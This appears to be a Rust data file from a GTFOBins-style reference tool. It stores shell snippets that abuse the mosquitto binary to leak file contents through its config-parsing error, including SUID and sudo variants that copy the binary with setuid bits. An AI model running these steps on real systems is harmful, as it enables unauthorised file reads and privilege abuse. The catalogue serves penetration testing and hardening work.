pub static BIN_NAME: &'static str = "mosquitto";
pub static BIN_DESC: &'static str = "The file is actually parsed and the first wrong line (ending with a newline or a null character) is returned in an error message, thus it may not be suitable for reading arbitrary files";
pub static FR_CODE: &'static str = r#"
    
    LFILE=file_to_read
    mosquitto -c "$LFILE"
"#;
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which mosquitto) .

    LFILE=file_to_read
    ./mosquitto -c "$LFILE"
"#;
pub static SUDO_CODE: &'static str = r#"
    
    LFILE=file_to_read
    sudo mosquitto -c "$LFILE"
"#;
use crate::code::{Code, Tag};
pub static FR: Code<'static> = Code { 
	title: "FR_CODE",
	code: FR_CODE,
	tag: Tag::FR,
};
pub static SUID: Code<'static> = Code { 
	title: "SUID_CODE",
	code: SUID_CODE,
	tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
